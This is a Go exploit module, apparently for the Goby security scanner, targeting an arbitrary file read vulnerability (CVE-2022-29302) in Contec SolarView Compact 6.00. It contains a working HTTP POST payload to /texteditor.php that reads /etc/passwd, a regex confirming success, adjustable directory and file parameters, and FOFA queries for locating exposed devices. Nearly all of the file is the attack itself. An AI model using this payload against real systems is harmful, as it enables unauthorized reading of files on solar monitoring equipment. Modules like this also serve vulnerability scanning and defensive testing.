package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Contec SolarView Compact Arbitrary file read vulnerability",
    "Description": "<p>Contec SolarView Compact is an application system from Contec Corporation of Japan.  Provide photovoltaic power generation measurement system. </p><p>Contec SolarView Compact 6.00 has an arbitrary file read vulnerability. This vulnerability is caused by the local file leak vulnerability in/HTML/solar_ftP.php in SolarView Compact, which can be exploited by an attacker to obtain local files.</p>",
    "Impact": "Contec SolarView Compact Arbitrary file read vulnerability",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.contec.com/cn\">https://www.contec.com/cn</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Contec SolarView Compact",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Contec SolarView Compact 任意文件读取漏洞",
            "Description": "<p>Contec SolarView Compact是日本Contec公司的一个应用系统。提供光伏发电测量系统。</p><p>Contec SolarView Compact 6.00版本存在任意文件读取漏洞，该漏洞源于SolarView Compact中的/html/Solar_Ftp.php存在本地文件泄露漏洞，攻击者可利用该漏洞获取本地文件。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Contec SolarView Compact 6.00版本存在任意文件读取漏洞，该漏洞源于SolarView Compact中的/html/Solar_Ftp.php存在本地文件泄露漏洞，攻击者可利用该漏洞获取本地文件。</span><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.contec.com/cn\">https://www.contec.com/cn</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "Contec SolarView Compact",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Contec SolarView Compact Arbitrary file read vulnerability",
            "Description": "<p>Contec SolarView Compact is an application system from Contec Corporation of Japan.&nbsp; Provide photovoltaic power generation measurement system.&nbsp;</p><p>Contec SolarView Compact 6.00 has an arbitrary file read vulnerability. This vulnerability is caused by the local file leak vulnerability in/HTML/solar_ftP.php in SolarView Compact, which can be exploited by an attacker to obtain local files.</p>",
            "Impact": "Contec SolarView Compact Arbitrary file read vulnerability",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.contec.com/cn\">https://www.contec.com/cn</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Product": "Contec SolarView Compact",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "body=\"SolarView Compact\" && title=\"Top\"",
    "GobyQuery": "body=\"SolarView Compact\" && title=\"Top\"",
    "Author": "tangyunmingt@gmail.com",
    "Homepage": "https://www.contec.com/cn",
    "DisclosureDate": "2022-05-26",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.5",
    "CVEIDs": [
        "CVE-2022-29302"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202205-3166"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/texteditor.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "directory=%2Fetc%2F&file=passwd&open=%8AJ%82%AD&r_charset=none&newfile=&contents=&w_charset=none&w_delimit=lf&editfile="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "<textarea name=\"contents\" cols=\"90\" rows=\"30\">[\\s\\S]{1}root:.*?root:/root:/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/texteditor.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "directory=%2Fetc%2F&file=passwd&open=%8AJ%82%AD&r_charset=none&newfile=&contents=&w_charset=none&w_delimit=lf&editfile="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "<textarea name=\"contents\" cols=\"90\" rows=\"30\">[\\s\\S]{1}root:.*?root:/root:/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dir",
            "type": "input",
            "value": "/etc/",
            "show": ""
        },
        {
            "name": "file",
            "type": "input",
            "value": "passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
